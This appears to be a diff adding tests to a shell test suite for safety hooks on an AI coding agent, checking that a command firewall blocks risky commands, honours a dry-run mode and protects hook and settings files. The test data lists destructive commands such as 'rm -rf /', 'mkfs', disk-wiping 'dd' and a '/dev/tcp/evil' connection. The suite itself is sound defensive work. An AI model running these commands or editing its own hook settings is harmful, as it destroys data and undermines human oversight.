@@ -54,7 +54,11 @@ assert_exit "Blocks eval" 0 "$FW" '{"tool_input":{"command":"eval \"rm -rf /\""}
 assert_exit "Blocks source /dev/" 0 "$FW" '{"tool_input":{"command":"source /dev/tcp/evil/80"}}'
 assert_exit "Blocks nano" 0 "$FW" '{"tool_input":{"command":"nano file.txt"}}'
 assert_exit "Blocks vi" 0 "$FW" '{"tool_input":{"command":"vi file.txt"}}'
+assert_exit "Blocks vim" 0 "$FW" '{"tool_input":{"command":"vim file.txt"}}'
+assert_exit "Blocks emacs" 0 "$FW" '{"tool_input":{"command":"emacs file.txt"}}'
 assert_exit "Blocks pip --break" 0 "$FW" '{"tool_input":{"command":"pip install --break-system-packages foo"}}'
+assert_exit "Blocks mkfs" 0 "$FW" '{"tool_input":{"command":"mkfs.ext4 /dev/sda1"}}'
+assert_exit "Blocks dd of=/dev/" 0 "$FW" '{"tool_input":{"command":"dd if=/dev/zero of=/dev/sda"}}'
 
 # Allowed commands (Exit 0)
 assert_exit "Allows ls -la" 0 "$FW" '{"tool_input":{"command":"ls -la"}}'
@@ -79,6 +83,10 @@ assert_exit "Blocks command rm -rf /" 0 "$FW" '{"tool_input":{"command":"command
 assert_exit "Blocks env rm -rf /" 0 "$FW" '{"tool_input":{"command":"env rm -rf /"}}'
 assert_exit "Blocks git push -f main" 0 "$FW" '{"tool_input":{"command":"git push -f origin main"}}'
 assert_exit "Blocks git push --force main" 0 "$FW" '{"tool_input":{"command":"git push --force origin main"}}'
+assert_exit "Blocks git push -f feature" 0 "$FW" '{"tool_input":{"command":"git push -f origin feature/my-feature"}}'
+assert_exit "Blocks git push --force feature" 0 "$FW" '{"tool_input":{"command":"git push --force origin feature/my-feature"}}'
+assert_exit "Blocks --force-with-lease main" 0 "$FW" '{"tool_input":{"command":"git push --force-with-lease origin main"}}'
+assert_exit "Blocks --force-with-lease feature" 0 "$FW" '{"tool_input":{"command":"git push --force-with-lease origin feature/x"}}'
 assert_exit "Blocks git push HEAD:main" 0 "$FW" '{"tool_input":{"command":"git push origin HEAD:main"}}'
 assert_exit "Blocks env bash -c" 0 "$FW" '{"tool_input":{"command":"env bash -c evil"}}'
 assert_exit "Blocks command eval" 0 "$FW" '{"tool_input":{"command":"command eval \"bad()\""}}'
@@ -158,6 +166,7 @@ assert_exit "Blocks hooks.json Write" 0 "$PF" '{"tool_name":"Write","tool_input"
 assert_exit "Blocks hooks.json Edit" 0 "$PF" '{"tool_name":"Edit","tool_input":{"file_path":"/home/c/.claude/hooks.json"}}'
 assert_exit "Blocks hooks/ Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/hooks/evil.sh"}}'
 assert_exit "Blocks settings.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/settings.json"}}'
+assert_exit "Blocks settings.local.json Write" 0 "$PF" '{"tool_name":"Write","tool_input":{"file_path":"/home/c/.claude/settings.local.json"}}'
 assert_exit "Allows hooks.json Read" 0 "$PF" '{"tool_name":"Read","tool_input":{"file_path":"/home/c/.claude/hooks.json"}}'
 
 echo ""
@@ -508,6 +517,100 @@ assert_exit "Exit 0 on normal stop" 0 "$STOPH" \
 
 assert_exit "Exit 0 when stop_hook_active true (skip loop)" 0 "$STOPH" \
   '{"stop_hook_active":true}'
+
+echo ""
+
+# --- bash-firewall.sh: Dry-run mode ---
+echo "-- bash-firewall.sh: Dry-run mode --"
+
+# Dry-run only applies to LOCAL patterns, not built-in ones.
+# Set up local patterns with docker rule, then test dry-run on it.
+ORIG_HOME="$HOME"
+DRY_HOME="$TMPDIR_TEST/home-dryrun"
+mkdir -p "$DRY_HOME/.claude"
+printf "LOCAL_DENY_PATTERNS=('docker\\\\s+run')\nLOCAL_DENY_REASONS=(\"Docker run blocked by local policy\")\n" \
+  >"$DRY_HOME/.claude/local-patterns.sh"
+
+# Dry-run mode: local pattern warns instead of blocking
+DRY_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$DRY_HOME" CLAUDE_FORGE_DRY_RUN=1 bash "$FW" 2>/dev/null)
+if [[ "$DRY_OUT" == *"systemMessage"* && "$DRY_OUT" == *"DRY-RUN"* ]]; then
+  printf '  %b[PASS]%b Dry-run: local pattern warns instead of blocking\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b Dry-run did not warn for local pattern: %s\n' "$RED" "$NC" "$DRY_OUT"
+  FAIL=$((FAIL + 1))
+fi
+
+# Normal mode: local pattern blocks
+NORMAL_LOCAL=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$DRY_HOME" bash "$FW" 2>/dev/null)
+if [[ "$NORMAL_LOCAL" == *"deny"* ]]; then
+  printf '  %b[PASS]%b Normal mode: local pattern blocks\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b Normal mode did not block local pattern: %s\n' "$RED" "$NC" "$NORMAL_LOCAL"
+  FAIL=$((FAIL + 1))
+fi
+
+export HOME="$ORIG_HOME"
+
+echo ""
+
+# --- bash-firewall.sh: Local patterns ---
+echo "-- bash-firewall.sh: Local patterns --"
+
+# Create temp local-patterns.sh
+ORIG_HOME="$HOME"
+TEST_HOME="$TMPDIR_TEST/home-local"
+mkdir -p "$TEST_HOME/.claude"
+printf 'LOCAL_DENY_PATTERNS=("\\bdocker\\s+run\\b")\nLOCAL_DENY_REASONS=("Docker run is blocked by local policy")\n' \
+  >"$TEST_HOME/.claude/local-patterns.sh"
+
+LOCAL_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$TEST_HOME" bash "$FW" 2>/dev/null)
+if [[ "$LOCAL_OUT" == *"deny"* && "$LOCAL_OUT" == *"Docker run"* ]]; then
+  printf '  %b[PASS]%b Local pattern blocks docker run\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b Local pattern did not block docker run: %s\n' "$RED" "$NC" "$LOCAL_OUT"
+  FAIL=$((FAIL + 1))
+fi
+
+# Without local-patterns, docker run is allowed
+NOLOCAL_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$TMPDIR_TEST/empty-home" bash "$FW" 2>/dev/null)
+if [[ -z "$NOLOCAL_OUT" || "$NOLOCAL_OUT" != *"deny"* ]]; then
+  printf '  %b[PASS]%b Without local patterns, docker run allowed\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b docker run unexpectedly blocked without local patterns: %s\n' "$RED" "$NC" "$NOLOCAL_OUT"
+  FAIL=$((FAIL + 1))
+fi
+
+export HOME="$ORIG_HOME"
+
+echo ""
+
+# --- protect-files.sh: Always blocks (no dry-run bypass) ---
+echo "-- protect-files.sh: No dry-run bypass --"
+DRY_PF_OUT=$(echo '{"tool_input":{"file_path":"/home/c/.env"}}' | CLAUDE_FORGE_DRY_RUN=1 bash "$PF" 2>/dev/null)
+if [[ "$DRY_PF_OUT" == *"deny"* ]]; then
+  printf '  %b[PASS]%b protect-files blocks .env even with DRY_RUN=1\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b protect-files did not block with DRY_RUN=1: %s\n' "$RED" "$NC" "$DRY_PF_OUT"
+  FAIL=$((FAIL + 1))
+fi
+
+echo ""
+
+# --- bash-firewall.sh: Built-in patterns ignore dry-run ---
+echo "-- bash-firewall.sh: Built-in ignores dry-run --"
+DRY_BUILTIN_OUT=$(echo '{"tool_input":{"command":"rm -rf /"}}' | CLAUDE_FORGE_DRY_RUN=1 bash "$FW" 2>/dev/null)
+if [[ "$DRY_BUILTIN_OUT" == *"deny"* ]]; then
+  printf '  %b[PASS]%b Built-in rm -rf / blocks even with DRY_RUN=1\n' "$GREEN" "$NC"
+  PASS=$((PASS + 1))
+else
+  printf '  %b[FAIL]%b Built-in pattern bypassed by DRY_RUN: %s\n' "$RED" "$NC" "$DRY_BUILTIN_OUT"
+  FAIL=$((FAIL + 1))
+fi
 
 echo ""
 
